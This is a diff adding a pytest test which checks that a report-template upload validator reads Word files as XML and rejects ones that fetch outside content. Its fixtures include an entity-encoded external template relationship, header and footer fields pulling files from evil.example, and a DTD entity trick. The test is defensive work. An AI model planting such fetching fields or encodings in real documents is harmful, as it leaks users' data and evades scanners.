@@ -216,6 +216,60 @@ def test_a_word_styles_file_that_fetches_from_outside_is_refused_and_a_hyperlink
         store.validate(styles, (shipped / "pentest" / "reference.docx").read_bytes())
 
 
+_W_NS = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
+
+
+def _header(body: str) -> str:
+    return f'<?xml version="1.0"?><w:hdr {_W_NS}><w:p>{body}</w:p></w:hdr>'
+
+
+def _complex_field(*instr_runs: str) -> str:
+    runs = "".join(f'<w:r><w:instrText xml:space="preserve">{t}</w:instrText></w:r>' for t in instr_runs)
+    return (f'<w:r><w:fldChar w:fldCharType="begin"/></w:r>{runs}'
+            '<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>shown</w:t></w:r>'
+            '<w:r><w:fldChar w:fldCharType="end"/></w:r>')
+
+
+def test_a_word_styles_file_is_read_as_xml_not_as_text(root):
+    """Review 2026-10-23b, REP-7: the check was a regex over the raw bytes, so
+    ``TargetMode="&#69;xternal"`` — "External" to Word — passed, and a header
+    or footer field that fetches a file (pandoc carries the reference
+    document's headers and footers into every report) was not looked at."""
+    styles = _asset("reference-docx")
+    encoded = ('<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
+               'relationships/attachedTemplate" Target="file://evil.example/t.dotx" '
+               'TargetMode="&#69;xternal"/>')
+    fetching_headers = (
+        # Word splits an instruction over runs.
+        _header(_complex_field(' INCLUDEPIC', 'TURE "http://evil.example/x.png" \\d ')),
+        _header('<w:fldSimple w:instr=" INCLUDETEXT &quot;//share/t.docx&quot; "/>'),
+        _header(_complex_field(' LINK Excel.Sheet.12 "http://evil.example/b.xlsx" ')),
+    )
+    for part, xml in (
+        ("word/_rels/settings.xml.rels", _RELS.format(encoded)),
+        *(("word/header2.xml", h) for h in fetching_headers),
+        ("word/footer1.xml", fetching_headers[0].replace("w:hdr", "w:ftr")),
+    ):
+        with pytest.raises(store.AssetUploadError, match="outside itself"):
+            store.validate(styles, docx(extra={part: xml}))
+    # A DTD (an entity could hide anything) is unreadable, not a pass.
+    entity = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY e "External">]>'
+              '<Relationships><Relationship TargetMode="&e;" Target="x"/></Relationships>')
+    with pytest.raises(store.AssetUploadError, match="could not be read"):
+        store.validate(styles, docx(extra={"word/_rels/document.xml.rels": entity}))
+    # Fields that fetch nothing stay legal: a page number, a hyperlink whose
+    # target merely CONTAINS the word LINK, a field nested in another's result.
+    harmless = _header(
+        _complex_field(' PAGE ') + _complex_field(' HYPERLINK "http://example.com/LINK" ')
+        + '<w:fldSimple w:instr=" NUMPAGES "/>'
+    )
+    facts, _ = store.validate(styles, docx(extra={"word/header1.xml": harmless}))
+    assert facts["kind"] == "docx"
+    assert list(store._field_instructions(harmless.encode())) == [
+        " PAGE ", ' HYPERLINK "http://example.com/LINK" ', " NUMPAGES ",
+    ]
+
+
 @pytest.mark.parametrize("name", ["pentest%0A", "pentest%20", "%20pentest"])
 def test_a_template_name_with_a_newline_or_space_is_not_a_template(client, root, test_project, tmp_path, name):
     """Review 2026-10-23, R-RPT3: ``^…$`` accepted "pentest\\n", the lookup
